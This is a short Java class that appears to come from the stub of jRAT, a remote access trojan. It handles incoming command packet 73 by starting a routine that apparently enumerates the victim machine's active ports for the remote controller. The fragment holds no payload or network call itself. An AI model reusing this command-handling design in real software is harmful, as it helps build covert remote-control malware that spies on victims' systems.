package se.jrat.stub.packets.incoming;

import se.jrat.stub.ActivePorts;

public class Packet73ActivePorts extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new ActivePorts().start();
	}

}
